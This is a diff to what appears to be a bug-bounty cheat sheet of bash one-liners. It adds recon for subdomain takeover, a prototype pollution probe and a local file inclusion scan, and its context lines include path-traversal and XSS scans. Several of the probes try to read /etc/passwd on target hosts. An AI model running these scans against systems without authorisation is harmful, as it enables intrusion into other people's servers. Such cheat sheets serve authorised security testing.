@@ -229,6 +229,12 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 
 - Bash One liners and More.
 
+
+### Subdomain Takeover 
+
+```bash
+subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
+```
 ### XSS 
 ```bash
 echo target.com | gau | while read url; python3 xsstrike.py -u $url --crawl -l 2; done;
@@ -261,6 +267,17 @@ echo "target.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf red
 ```bash
 httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
 ```
+
+### Prototype Pollution
+```bash
+subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
+```
+### Local File Inclusion
+
+```bash
+gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+```
+
 
 
 
